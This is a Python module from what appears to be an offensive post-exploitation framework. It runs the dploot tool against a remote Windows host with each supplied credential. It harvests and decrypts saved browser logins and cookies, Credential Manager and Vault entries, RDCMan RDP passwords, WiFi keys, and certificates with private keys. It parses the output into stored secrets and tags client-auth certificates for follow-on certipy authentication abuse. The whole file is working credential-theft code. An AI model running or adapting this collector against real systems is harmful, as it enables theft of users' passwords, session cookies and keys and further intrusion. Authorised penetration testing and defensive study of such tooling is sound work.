"""DPAPI loot via the dploot CLI: browser pw/cookies, Credential Manager, Vaults,
certificates, RDCMan (.rdg), WiFi. Per-credential: tries every cred, decrypts
what it can. Tolerant parsing; raw output always saved."""
from __future__ import annotations

import re
from typing import List

from core.credential import Credential
from core.secret import Secret, Status
from core.tools import find_tool, run
from .base import BaseCollector

URL_RE = re.compile(r"(https?://\S+)", re.I)
KV_RE = re.compile(r"^\s*(url|origin|target|resource|server|service|ssid|username|"
                   r"user|login|password|pass|secret|key|cookie)\s*[:=]\s*(.+?)\s*$", re.I)


def _flush(host, source, buf) -> List[Secret]:
    user = buf.get("username") or buf.get("user") or buf.get("login") or ""
    pw = (buf.get("password") or buf.get("pass") or buf.get("secret")
          or buf.get("key") or buf.get("cookie") or "")
    tgt = (buf.get("url") or buf.get("origin") or buf.get("target")
           or buf.get("resource") or buf.get("server") or buf.get("service")
           or buf.get("ssid") or "")
    if not (user or pw):
        return []
    stype = "cookie" if "cookie" in buf else "password"
    return [Secret(host, source, user, pw, Status.DECRYPTED,
                   target=tgt, secret_type=stype)]


class _DplootModule(BaseCollector):
    per_credential = True
    requires = ("dploot",)
    module = ""
    source = ""

    def collect_with_cred(self, cred: Credential) -> List[Secret]:
        bin_ = find_tool("dploot")
        if not bin_:
            return []
        cmd = [bin_, self.module] + cred.dploot_auth_args() + [self.host]
        res = run(cmd, timeout=self.timeout, raw_dir=self.raw_dir,
                  raw_name=self._raw_name(cred))
        return self._parse(res.output)

    def _parse(self, out: str) -> List[Secret]:
        found: List[Secret] = []
        buf: dict = {}
        for line in out.splitlines():
            if not line.strip():
                if buf:
                    found += _flush(self.host, self.source, buf); buf = {}
                continue
            m = KV_RE.match(line)
            if m:
                buf[m.group(1).lower()] = m.group(2)
                continue
            if buf:
                found += _flush(self.host, self.source, buf); buf = {}
        if buf:
            found += _flush(self.host, self.source, buf)
        return self._dedup(found)

    @staticmethod
    def _dedup(items: List[Secret]) -> List[Secret]:
        seen, out = set(), []
        for s in items:
            if s.key() in seen:
                continue
            seen.add(s.key()); out.append(s)
        return out


class BrowserCollector(_DplootModule):
    name = "Browser"; source = "Browser"; module = "browser"
    description = "Chrome/Edge/Firefox saved logins + cookies (auto-decrypted)"


class CredManCollector(_DplootModule):
    name = "CredMan"; source = "CredMan"; module = "credentials"
    description = "Windows Credential Manager"


class VaultsCollector(_DplootModule):
    name = "Vaults"; source = "Vault"; module = "vaults"
    description = "Windows Vaults"


class RdgCollector(_DplootModule):
    name = "RDCMan"; source = "RDCMan"; module = "rdg"
    description = "RDCMan .rdg saved RDP credentials"


class WifiCollector(_DplootModule):
    name = "WiFi"; source = "WiFi"; module = "wifi"
    description = "WLAN profile PSK / 802.1X"


class CertificatesCollector(_DplootModule):
    name = "Certs"; source = "Cert"; module = "certificates"
    description = "User/machine certificates + private keys (client-auth = ADCS/PKINIT)"

    def _parse(self, out: str) -> List[Secret]:
        found: List[Secret] = []
        for line in out.splitlines():
            low = line.lower()
            if "written" in low and (".pfx" in low or ".pem" in low):
                path = line.split()[-1]
                clientauth = "client authentication" in out.lower()
                found.append(Secret(self.host, "Cert", "", path,
                                    Status.DECRYPTED, secret_type="pfx",
                                    notes="client-auth cert -> certipy auth"
                                          if clientauth else "certificate + key"))
        return self._dedup(found)
